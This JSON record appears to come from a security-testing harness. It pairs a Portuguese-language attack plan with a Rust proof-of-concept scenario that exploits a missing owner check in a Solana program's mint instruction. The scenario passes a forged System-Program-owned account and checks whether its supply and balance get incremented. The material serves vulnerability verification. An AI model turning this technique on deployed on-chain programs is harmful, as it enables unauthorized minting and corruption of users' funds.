{
  "plan": "O ataque explora a ausência de verificação de owner na instrução mint. Montamos uma conta forjada com owner diferente do programa (System Program) e dados com supply/balance em offsets 40..56. O baseline usa uma conta legítima com owner igual ao program_id e chama mint com amount=1, provando que o cenário está correto. O ataque repete a mesma chamada, mas com a conta forjada; se a instrução aceitar, o supply e balance da conta forjada serão incrementados, demonstrando a corrupção de dados de uma conta que não pertence ao programa.",
  "scenario": "let program_id = env.program_id;

// Conta legítima (owner = program_id) com dados iniciais
let mut legit_data = vec![0u8; 56];
legit_data[40..48].copy_from_slice(&100u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let legit_account = account(&program_id, &legit_data, None);

// Conta forjada (owner = System Program) com os mesmos dados iniciais
let mut forged_data = vec![0u8; 56];
forged_data[40..48].copy_from_slice(&100u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);

// Instrução mint: discriminador 2 + amount u64 LE
let mut ix_data = vec![2u8];
ix_data.extend_from_slice(&1u64.to_le_bytes());

// Baseline: usa a conta legítima
let metas_legit = vec![AccountMeta::new(legit_account_key, false)];
let ix_legit = env.raw_ix(&ix_data, metas_legit);
let contas_legit = vec![(legit_account_key, legit_account)];
let r_base = env.baseline("mint legitimo", &ix_legit, &contas_legit);

// Ataque: usa a conta forjada
let metas_forged = vec![AccountMeta::new(forged_account_key, false)];
let ix_forged = env.raw_ix(&ix_data, metas_forged);
let contas_forged = vec![(forged_account_key, forged_account)];
let r_attack = env.attack("mint com conta forjada", &ix_forged, &contas_forged);

if r_attack.program_result == ProgramResult::Success {
    let forged_after = after(&r_attack, &forged_account_key);
    let supply_after = read_u64(forged_after.data(), 40);
    let balance_after = read_u64(forged_after.data(), 48);
    env.effect("supply da conta forjada incrementado", supply_after == 101);
    env.effect("balance da conta forjada incrementado", balance_after == 51);
}"
}

